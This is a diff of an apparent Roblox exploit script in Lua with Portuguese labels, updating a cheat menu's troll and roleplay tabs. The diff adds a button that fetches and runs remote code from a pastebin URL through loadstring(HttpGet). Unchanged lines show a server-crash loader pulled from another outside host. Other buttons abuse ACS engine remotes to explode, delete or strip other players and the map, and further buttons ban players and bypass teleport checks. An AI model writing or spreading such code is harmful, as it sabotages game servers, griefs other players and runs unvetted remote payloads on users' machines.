@@ -130,7 +130,7 @@
         PremiumOnly = false                    
     })    
     local RoleplayTab = Window:MakeTab({
-        Name = "Roleplay",
+        Name = "Acs Rp",
         Icon = "rbxassetid://4483345998",
         PremiumOnly = false      
     })    
@@ -1028,6 +1028,12 @@ plrTab:AddButton({
           end   
         })
     TrollTab:AddButton({
+        Name = "Hub Player",
+        Callback = function()
+            loadstring(game:HttpGet("https://pastebin.com/raw/eUwg0n1f"))()
+          end   
+        })
+    TrollTab:AddButton({
         Name = "Crashar server - Risco",
         Callback = function()
             loadstring(game:HttpGet('https://bifao.tech/scripts/ilhabela.lol'))()
@@ -1660,7 +1666,7 @@ local Section = RoleplayTab:AddSection({
 	Name = "RP"
 })
     RoleplayTab:AddButton({
-        Name = "Deletar Roupa Geral",
+        Name = "Deletar Roupa Geral - Acs 1.7.5",
         Callback = function()
             local rmt = game:service'ReplicatedStorage':FindFirstChild("DeleteCar")
             for i,v in pairs(game:GetService("Workspace"):GetDescendants()) do
@@ -1671,7 +1677,7 @@ local Section = RoleplayTab:AddSection({
           end   
     })
     RoleplayTab:AddButton({
-        Name = "Deletar Mapa",
+        Name = "Deletar Mapa - Acs 1.7.5",
         Callback = function()
             local rmt = game:service'ReplicatedStorage':FindFirstChild("DeleteCar")
             for i,v in next, workspace:GetChildren() do
@@ -1680,7 +1686,7 @@ local Section = RoleplayTab:AddSection({
           end   
     })
     RoleplayTab:AddButton({
-        Name = "Creeper Geral",
+        Name = "Creeper Geral - Acs 1.7.5",
         Callback = function()
             local rmt = game:service'ReplicatedStorage':FindFirstChild("DeleteCar")
 		for i,v in pairs(game:GetService("Workspace"):GetDescendants()) do
@@ -1691,7 +1697,7 @@ local Section = RoleplayTab:AddSection({
         end   
     }) 
 RoleplayTab:AddButton({
-	Name = "Explodir Geral",
+	Name = "Explodir Geral - Acs 1.7.5",
 	Callback = function()
         local rem,_t,players = game:GetService("ReplicatedStorage").ACS_Engine.Eventos.Hit,{ExplosiveHit=true,ExPressure=math.huge,ExpRadius=math.huge,DestroyJointRadiusPercent=math.huge,ExplosionDamage=math.huge},game:GetService('Players')
 	
@@ -1704,7 +1710,7 @@ RoleplayTab:AddButton({
   	end 
 })
 RoleplayTab:AddButton({
-	Name = "Tool Destruir",
+	Name = "Tool Destruir - Acs 1.7.5",
 	Callback = function()
         local Mouse = game.Players.LocalPlayer:GetMouse()
 	
@@ -1724,7 +1730,7 @@ local Section = AdmTab:AddSection({
 	Name = "Admin"
         })
 local Section = RoleplayTab:AddSection({
-	Name = "Option Banir/Expulsar"
+	Name = "Op Banir/Expulsar"
     })
     RoleplayTab:AddButton({
         Name = "Banir Jogadores",
@@ -2421,7 +2427,7 @@ local Section = JogadorTab:AddSection({
 	Name = "Geral"
 })
     JogadorTab:AddButton({
-        Name = "Controll TP - Bypass",
+        Name = "Control TP - Bypass",
         Callback = function()
             local UIS = game:GetService("UserInputService")
  
